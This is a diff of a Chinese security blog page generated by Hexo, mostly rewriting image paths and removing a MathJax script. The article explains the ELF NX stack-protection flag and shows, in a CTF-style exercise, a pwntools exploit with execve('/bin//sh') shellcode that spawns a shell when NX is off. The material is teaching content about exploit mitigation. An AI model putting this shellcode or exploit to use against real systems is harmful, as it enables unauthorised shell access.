@@ -13,13 +13,13 @@
 <meta property="og:site_name" content="1nv0k3r&#39;s blog">
 <meta property="og:description" content="NX是栈不可执行保护, 即让栈上的数据无法作为指令执行NX实际上是给栈加了一个权限标志位, 让程序识别其权限 这个标志位保存在program header里启动神器010editor, 运行ELF文件的template  可以看到各个段的信息, GNU stack即栈, 点开可以看到权限  0x7表示R&#x2F;W&#x2F;X权限, 即NX Disable 那么我们如果想开NX, 设置为R&#x2F;W权限即可  例题:">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/06/06/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-35-56.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/06/06/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-37-11.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/06/06/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-38-36.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/06/06/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-42-10.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/06/06/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-42-51.png">
+<meta property="og:image" content="http://1nv0k3r.fun/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-35-56.png">
+<meta property="og:image" content="http://1nv0k3r.fun/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-37-11.png">
+<meta property="og:image" content="http://1nv0k3r.fun/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-38-36.png">
+<meta property="og:image" content="http://1nv0k3r.fun/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-42-10.png">
+<meta property="og:image" content="http://1nv0k3r.fun/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-42-51.png">
 <meta property="article:published_time" content="2019-06-06T05:32:08.000Z">
-<meta property="article:modified_time" content="2021-04-15T06:19:19.816Z">
+<meta property="article:modified_time" content="2021-04-15T06:30:36.624Z">
 <meta property="article:author" content="1nv0k3r">
 <meta property="article:tag" content="1nv0k3r">
 <meta property="article:tag" content=" blog">
@@ -28,7 +28,7 @@
 <meta property="article:tag" content=" exploit">
 <meta property="article:tag" content=" vuln">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://1nv0k3r.fun/2019/06/06/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-35-56.png">
+<meta name="twitter:image" content="http://1nv0k3r.fun/images/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6%E7%9A%84NX%E4%BF%9D%E6%8A%A4/2019-06-06-13-35-56.png">
     
     
         
@@ -64,7 +64,8 @@
     
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body class="max-width mx-auto px3 ltr">    
+<body class="max-width mx-auto px3 ltr">
+    
       <div id="header-post">
   <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
   <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
@@ -158,19 +159,19 @@
   <div class="content" itemprop="articleBody">
     <p>NX是栈不可执行保护, 即让栈上的数据无法作为指令执行<br>NX实际上是给栈加了一个权限标志位, 让程序识别其权限</p>
 <p>这个标志位保存在<code>program header</code>里<br>启动神器<code>010editor</code>, 运行ELF文件的template</p>
-<p><img src="../images/修改ELF文件的NX保护/2019-06-06-13-35-56.png" alt=""></p>
+<p><img src="/images/修改ELF文件的NX保护/2019-06-06-13-35-56.png" alt=""></p>
 <p>可以看到各个段的信息, <code>GNU stack</code>即栈, 点开可以看到权限</p>
-<p><img src="../images/修改ELF文件的NX保护/2019-06-06-13-37-11.png" alt=""></p>
+<p><img src="/images/修改ELF文件的NX保护/2019-06-06-13-37-11.png" alt=""></p>
 <p><code>0x7</code>表示<code>R/W/X</code>权限, 即<code>NX Disable</code></p>
 <p>那么我们如果想开NX, 设置为<code>R/W</code>权限即可</p>
-<p><img src="../images/修改ELF文件的NX保护/2019-06-06-13-38-36.png" alt=""></p>
+<p><img src="/images/修改ELF文件的NX保护/2019-06-06-13-38-36.png" alt=""></p>
 <p>例题: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/5afea37c3946a">下载</a></p>
 <p>exp:</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = <span class="string">'The_Pursuit_of_Happiness'</span></span><br><span class="line">a = <span class="string">'I_Need_BMW'</span></span><br><span class="line">pas = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    pas += chr(ord(s[i]) ^ ord(a[i]))</span><br><span class="line"><span class="comment"># xor    %ecx,%ecx</span></span><br><span class="line"><span class="comment"># push   $0x21</span></span><br><span class="line"><span class="comment"># pop    %eax</span></span><br><span class="line"><span class="comment"># sub    %eax, 0x15</span></span><br><span class="line"><span class="comment"># push   %ecx</span></span><br><span class="line"><span class="comment"># push   $0x68732f2f</span></span><br><span class="line"><span class="comment"># push   $0x6e69622f</span></span><br><span class="line"><span class="comment"># mov    %esp,%ebx</span></span><br><span class="line"><span class="comment"># int    $0x80</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\x6a\x21\x58\x83\xe8\x16\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">pas += <span class="string">'t_of_Happiness'</span> + <span class="string">'a'</span> * <span class="number">0x5b</span> + shellcode</span><br><span class="line">p = process(<span class="string">'./5afea37c3946a'</span>)</span><br><span class="line"><span class="comment"># p = remote('101.71.29.5', 10034)</span></span><br><span class="line">p.sendlineafter(<span class="string">'user name : '</span>, <span class="string">'a'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'password : '</span>, <span class="string">'b'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'information: '</span>, pas)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>在NX没开的情况下执行我们的shellcode即可getshell:</p>
-<p><img src="../images/修改ELF文件的NX保护/2019-06-06-13-42-10.png" alt=""></p>
+<p><img src="/images/修改ELF文件的NX保护/2019-06-06-13-42-10.png" alt=""></p>
 <p>用上面的方法打开NX以后, shellcode就失效了:</p>
-<p><img src="../images/修改ELF文件的NX保护/2019-06-06-13-42-51.png" alt=""></p>
+<p><img src="/images/修改ELF文件的NX保护/2019-06-06-13-42-51.png" alt=""></p>
 
   </div>
 </article>
@@ -254,22 +255,6 @@
 </footer>
 
     </div>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
-
 </body>
 </html>
 <!-- styles -->
